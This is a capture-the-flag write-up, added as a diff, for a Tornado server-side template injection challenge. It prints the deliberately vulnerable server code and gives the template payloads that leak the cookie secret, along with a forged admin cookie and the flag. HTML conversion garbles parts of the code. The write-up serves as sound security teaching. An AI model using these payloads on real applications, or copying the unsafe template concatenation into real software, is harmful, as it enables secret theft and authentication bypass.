@@ -1,0 +1,140 @@
+<h1>The Usual Suspects</h1>
+
+<p>Author: <a href="https:github.com/SrishtiGohain">SrishtiGohain</a></p>
+
+<h2>Description</h2>
+
+<p>This is a simple Server Side Template Injection challenge.</p>
+
+<h2>Requirements</h2>
+
+<ul>
+<li>Python</li>
+<li>tornado</li>
+</ul>
+
+<h2>Sources</h2>
+
+<p><code>
+You may think I walk with no 'name' because it can be changed whenever I want. I am a 'person' whose 'secret' can never be found. Can you find this 'person's 'secret'?
+(I love you 8000.)
+</code></p>
+
+<h2>Exploit</h2>
+
+<p>```python</p>
+
+<h1>SOURCE CODE: server.py</h1>
+
+<p>import tornado.template
+import tornado.ioloop
+import tornado.web
+import os, pwd, grp</p>
+
+<p>def drop<em>privileges(uid</em>name='ctf', gid<em>name='ctf'):
+    running</em>uid = pwd.getpwnam(uid<em>name).pw</em>uid
+    running<em>gid = grp.getgrnam(gid</em>name).gr_gid</p>
+
+<pre><code>os.setgroups([])
+
+os.setgid(running_gid)
+os.setuid(running_uid)
+
+old_umask = os.umask(0o077)
+</code></pre>
+
+<p>flag = open('rf.txt').read()
+secret = open('cs.txt').read()</p>
+
+<p>TEMPLATE = '''
+<html>
+ <head><title> 🐱‍👤Hello Hacker</title></head>
+ <body style="background: #00FFFF;text-align:center;">
+ <h1 style="font-size:5rem;"> 🐱‍👤 The Usual Suspects 🐱‍👤 </h1>
+ <br />
+ <h2 style="font-size:4rem;"> You Have Arrived! </h2>
+ <br />
+ <p style="font-size:2rem;"> 
+ <p>Hey, wanna know how I rate some ice-cream flavours?</p>
+ <form method="GET"  action='/'>
+  <select id="icecream" name="icecream">
+      <option value="{{!chocolate}}">chocolate</option>
+      <option value="{{!vanilla}}">vanilla</option>
+      <option value="{{!butterscotch}}">butterscotch</option>
+  </select>
+  <input type="submit"></input>
+ </form>
+ <p>FOO</p>
+ </p>
+ <br/> <br/>
+ <p style="text-align:center; font-size:2rem;">
+ Oh I heard you're looking for my secret. <br>
+ <b>{{secret}}</b>
+ </p>
+ </body>
+</html>
+'''</p>
+
+<p>class MainHandler(tornado.web.RequestHandler):</p>
+
+<pre><code>def get(self):
+
+    chocolate = "My fav!! 10/10, would eat again"
+    vanilla = 'Vanilla is good too, but could be better, i give it a 7/10'
+    butterscotch = 'Yuck, who even likes that. 1/10'
+
+    template_data = TEMPLATE.replace("FOO",self.get_argument('icecream',''))
+    t = tornado.template.Template(template_data)
+    secret = "Unfortunately, you aren't worthy"
+    if self.get_secure_cookie("admin")==b"true":
+        secret = flag
+    else:
+        self.set_secure_cookie("admin", "false")
+    self.write(t.generate(chocolate=chocolate,vanilla=vanilla, butterscotch=butterscotch, application=application, secret=secret))
+</code></pre>
+
+<p>application = tornado.web.Application([
+    (r"/", MainHandler)
+], debug=True, static<em>path=None, template</em>path=None, cookie_secret=secret)</p>
+
+<p>if <strong>name</strong> == '<strong>main</strong>':
+    drop_privileges()
+    application.listen(9999)
+    print("Listening :)")
+    tornado.ioloop.IOLoop.instance().start()
+```
+<br /></p>
+
+<ul>
+<li><p>The server script runs on <code>http://chall.csivit.com:30279/</code>. Input is taken as the "icecream" value. </p></li>
+<li><p>A secure cookie is being set and compared to print a flag value. In tornado, signed cookies contain the encoded value of the cookie
+alongwith a timestamp and an HMAC signature. Such cookies are supported by the set<em>secure</em>cookie and get<em>secure</em>cookie methods which require a specific secret key: cookie_secret.</p></li>
+<li><p>Upon visiting <code>http://chall.csivit.com:30279/?icecream={{globals()}}</code>, you see something useful:</p></li>
+</ul>
+
+<p><code>
+'application': &lt;tornado.web.Application object at 0x7f2976579750&gt;,
+</code></p>
+
+<ul>
+<li><p>You now know that the name of the variable <code>tornado.web.Application(...)</code> is <code>application</code>.</p></li>
+<li><p>Run the server script with the exploit payload <code>http://chall.csivit.com:30279/?icecream={{application.settings["cookie_secret"]}}</code> to get the cookie_secret value <code>MangoDB</code> displayed on the website.</p></li>
+<li><p>Replace the value of the secure cookie <code>admin</code> to the required comparison value <code>true</code> to obtain a signed cookie on the browser. Now, replace the signed cookie generated upon running the server script with the one obtained after the secure cookie value was set to <code>true</code>. This results in a cookie which looks like the following. Note <code>dHJ1ZQ==</code> is base64 for <code>true</code>.</p></li>
+</ul>
+
+<p><code>
+"2|1:0|10:1594808471|5:admin|8:dHJ1ZQ==|5da7d1e446451e825e42001e7f07360e2e2e77c9c68b14fca1a517259712cdac"
+</code></p>
+
+<ul>
+<li>Upon reloading the server script, the text on the website would change from <code>Unfortunately, you aren't worthy</code> to the flag value:</li>
+</ul>
+
+<p><code>
+csictf{h3r3_i_4m}
+</code></p>
+
+<p>The flag is:
+<code>
+csictf{h3r3_i_4m}
+</code></p>
